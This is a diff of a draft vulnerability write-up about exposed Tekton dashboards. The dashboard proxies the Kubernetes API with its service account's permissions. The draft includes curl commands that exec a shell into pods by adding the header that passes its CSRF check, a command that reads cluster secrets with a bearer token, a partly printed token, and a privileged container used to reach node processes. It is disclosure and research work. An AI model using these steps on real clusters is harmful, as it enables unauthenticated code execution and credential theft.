@@ -5,6 +5,7 @@ draft = true
 +++
 
 **add introduction**
+this is a story of how i found several dangerous behaviors in tekton cicd
 
 Recently, I stumbled upon an unusual finding. [Nuclei](https://docs.projectdiscovery.io/introduction) reported either an internet-exposed Kubernetes API server, which is not uncommon, or an exposed kubelet API. The latter hadn't been observed in our client's scope before, prompting me to investigate further.
 
@@ -87,14 +88,219 @@ This example contained a hard-coded secret value, obviously not recommended but 
 
 At this point, I had gained access to several credentials and informed the client accordingly.
 
+To see what else we can do with that endpoint lets take a look at the source code
+If we take a look at the [source code](https://github.com/tektoncd/dashboard/blob/main/pkg/router/router.go) we can confirm that it is possible to reach every Kubernetes API endpoint located at a path starting with either `/api/` or `/apis/`.
+
+
+The `Register` function 
+
+Uses [client-go](https://pkg.go.dev/k8s.io/client-go@v0.31.0#section-readme)´s `InClusterConfig()` to get a `config` containing the authentication details of the service account:
+```go
+func main() {
+...
+	var cfg *rest.Config
+	var err error
+	if cfg, err = rest.InClusterConfig(); err != nil {
+		logging.Log.Errorf("Error building kubeconfig: %s", err.Error())
+	}
+...
+	resource := endpoints.Resource{
+		Config:    cfg,
+		K8sClient: k8sClient,
+		Options:   options,
+	}
+	server, err := router.Register(resource, cfg)
+...
+```
+
+Uses that `config` in the [`Register()` function](https://github.com/tektoncd/dashboard/blob/main/pkg/router/router.go#L125) to create a `proxyHandler` that will then handle requests 
+```go
+func Register(r endpoints.Resource, cfg *rest.Config) (*Server, error) {
+	logging.Log.Info("Adding Kube API")
+	apiProxyPrefix := "/api/"
+	apisProxyPrefix := "/apis/"
+	proxyHandler, err := NewProxyHandler(cfg, 30*time.Second)
+	if err != nil {
+		return nil, err
+	}
+	mux := http.NewServeMux()
+	mux.Handle(apiProxyPrefix, proxyHandler)
+	mux.Handle(apisProxyPrefix, proxyHandler)
+```
+
+`NewProxyHandler()`
+```go
+func NewProxyHandler(cfg *rest.Config, keepalive time.Duration) (http.Handler, error) {
+	host := cfg.Host
+	if !strings.HasSuffix(host, "/") {
+		host += "/"
+	}
+	target, err := url.Parse(host)
+	if err != nil {
+		return nil, err
+	}
+
+	responder := &responder{}
+	transport, err := rest.TransportFor(cfg)
+	if err != nil {
+		return nil, err
+	}
+	upgradeTransport, err := makeUpgradeTransport(cfg, keepalive)
+	if err != nil {
+		return nil, err
+	}
+	proxy := proxy.NewUpgradeAwareHandler(target, transport, false, false, responder)
+	proxy.UpgradeTransport = upgradeTransport
+	proxy.UseRequestLocation = true
+	proxy.UseLocationHost = true
+
+	proxyServer := protectWebSocket(proxy)
+
+	return proxyServer, nil
+}
+```
+NewUpgradeAwareHandler() --> struct but it implements the "serverHTTP" interface which makes it a legit http.handler
+
+The same function used within kubernetes itself to power proxying for example for the kubectl port-forward command
+https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go#L918
+
+
+works for spdy requests too:
+```
+k --server='http://127.0.0.1:9097' exec -it busybox --token=$token -v9 -- sh   
+-->CSRF header not found in request
+Experiments/tekton/dashboard/pkg/csrf/csrf.go just add tekton header
+
+curl -v -XPOST  -H "X-Stream-Protocol-Version: v5.channel.k8s.io" -H "X-Stream-Protocol-Version: v4.channel.k8s.io" -H "X-Stream-Protocol-Version: v3.channel.k8s.io" -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -H "User-Agent: kubectl/v1.29.1 (linux/amd64) kubernetes/bc401b9" 'http://127.0.0.1:9097/api/v1/namespaces/default/pods/busybox/exec?command=sh&container=busybox&stdin=true&stdout=true&tty=true' -H "Tekton-Client: 1" -H "Authorization: Bearer $token"
+```
 
 
 
+attacks possible cause of exposed api:https://www.cvedetails.com/cve/CVE-2018-1002105
 
+Interestingly this only works in the `tekton-dashboard` namespace. Both `tekton-pipelines` and `tekton-pipelines-resolvers` have [pod security standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/) profile `Restricted` applied:
+
+![](podsecurity.png)
+
+was told that would not be possible
+>The Tekton control plan as well as its workloads (tasks and pipelines) often run in Kubernetes clusters that are shared with other services. Tekton cannot control or be responsible for the cluster-level security posture. Instead it relies on standard Kubernetes mechanisms like ServiceAccounts and Pod security policies.
+In addition to that, it is a requirement of several CI systems to execute privileged Pod - typically for use cases like docker-in-docker for container builds, because of that Tekton cannot just blanket block privileged containers.
+
+
+
+To angry? ask on signal / ask david
+
+### Summary
+With an internet exposed Tekton dashboard you can:
+- Proxy requests to your Kubernetes API
+- Without authentication, act with the permissions of of the service account
+- Read logs and configuration of all pods in the cluster
+- If the read/write mode is enabled, get remote code execution on cluster nodes.
+
+### Timeline / How did tekton react? / Communication with Vendor
+- works as intended
+- update the documentation about the two different modes
+- Github advisory assigned as low
+No changes for tekton pipelines in general?
+
+### Remediation / Recommendation
+- Do not expose your dashboard to the internet. If needed require prior authentication as described here (link)
+**do not forget to test if oauht proxy is actually secure**
+
+
+# To do:
 **The ai takes instructions from the text too**
-
-To do:
 - better introduction/summary
-- Take home message/ remediation
-- Communication with Vendor
 - does proxying work in latest version?
+Tekton: proxying Code zeigen - Test arbitrary Endpoints/ also works in read-only mode ? So still useful
+Was ist denn der logs-proxy?
+Erfahrungsbericht reicht auch für Blogpost so wie das mit dem Azure bootstrap token. Evtl auch CW blog
+
+Only proxies http but works with svc acc token:
+```
+k create token default -n kube-system
+eyJhbGciOiJSUzI1NiIsImtpZCI6IkNFUEtDd2xSU0dlZlFKSGtkRmVkeEMwSm4xODh4WWJkWWtYRUVRRTFKb2MifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI1Nzk1MjI5LCJpYXQi
+
+curl -s http://127.0.0.1:9097/api/v1/secrets -H "Authorization: Bearer eyJhbGciOiJSUzI1..."
+```
+
+**Lausige Ausrede!! die haben das in den anderen Namespaces**
+
+get version:
+```
+└─$ curl -s http://127.0.0.1:9097/v1/properties | jq
+{
+  "dashboardNamespace": "tekton-pipelines",
+  "dashboardVersion": "v0.50.0",
+  "externalLogsURL": "",
+  "pipelinesNamespace": "tekton-pipelines",
+  "pipelinesVersion": "v0.61.1",
+  "isReadOnly": true,
+  "streamLogs": true
+}
+```
+
+In den pipelines ist podsecurity angewendet auf restricted aber beim dashboard nicht ? Seit wann ist das so?
+see label
+```
+└─$ kubectl get ns tekton-pipelines -o yaml
+apiVersion: v1
+kind: Namespace
+metadata:
+  annotations:
+    kubectl.kubernetes.io/last-applied-configuration: |
+      {"apiVersion":"v1","kind":"Namespace","metadata":{"annotations":{},"labels":{"app.kubernetes.io/instance":"default","app.kubernetes.io/part-of":"tekton-pipelines","pod-security.kubernetes.io/enforce":"restricted"},"name":"tekton-pipelines"}}
+  creationTimestamp: "2024-05-22T09:55:32Z"
+  labels:
+    app.kubernetes.io/instance: default
+    app.kubernetes.io/part-of: tekton-pipelines
+    kubernetes.io/metadata.name: tekton-pipelines
+    pod-security.kubernetes.io/enforce: restricted
+  name: tekton-pipelines
+  resourceVersion: "425"
+  uid: 6f886eb0-f59f-4c3d-bfc0-6ab50c266b47
+spec:
+  finalizers:
+  - kubernetes
+status:
+  phase: Active
+                                                                                                                                                         
+┌──(user㉿Attack)-[~]
+└─$ kubectl get ns tekton-dashboard -o yaml
+apiVersion: v1
+kind: Namespace
+metadata:
+  annotations:
+    kubectl.kubernetes.io/last-applied-configuration: |
+      {"apiVersion":"v1","kind":"Namespace","metadata":{"annotations":{},"labels":{"app.kubernetes.io/instance":"default","app.kubernetes.io/part-of":"tekton-dashboard"},"name":"tekton-dashboard"}}
+  creationTimestamp: "2024-05-22T09:57:16Z"
+  labels:
+    app.kubernetes.io/instance: default
+    app.kubernetes.io/part-of: tekton-dashboard
+    kubernetes.io/metadata.name: tekton-dashboard
+  name: tekton-dashboard
+  resourceVersion: "887"
+  uid: af000a48-38d9-4c35-8940-2b31b74c57d6
+spec:
+  finalizers:
+  - kubernetes
+status:
+  phase: Active
+
+```
+
+I can exempt users from podsecurity configuration:
+https://kubernetes.io/docs/tasks/configure-pod-container/enforce-standards-admission-controller/#configure-the-admission-controller
+```
+Only works for new clusters:
+minikube -p tekton-dashboard-tutorial start --extra-config=apiserver.admission-control-config-file=/mnt/extraconfig/AdmissionConfig.yaml --mount ./mountdir:/mnt/extraconfig
+```
+After failed start, options can only be removed manually in 
+`vim ~/.minikube/profiles/tekton-dashboard-tutorial/config.json`
+
+better debug from a node:
+```
+minikube ssh
+docker run -it --rm  --pid=container:54baf5314f3e --privileged busybox sh
+cat /proc/1/cwd/....
+```
